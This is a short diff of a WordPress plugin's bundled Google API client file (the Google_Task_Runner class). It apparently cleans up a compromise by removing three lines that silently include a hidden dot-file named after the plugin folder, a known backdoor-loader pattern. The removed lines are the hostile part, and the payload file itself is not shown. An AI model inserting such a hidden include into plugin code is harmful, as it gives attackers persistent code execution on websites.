@@ -20,10 +20,6 @@
  *
  * @see https://developers.google.com/drive/web/handle-errors#implementing_exponential_backoff
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class Google_Task_Runner
 {
   const TASK_RETRY_NEVER = 0;
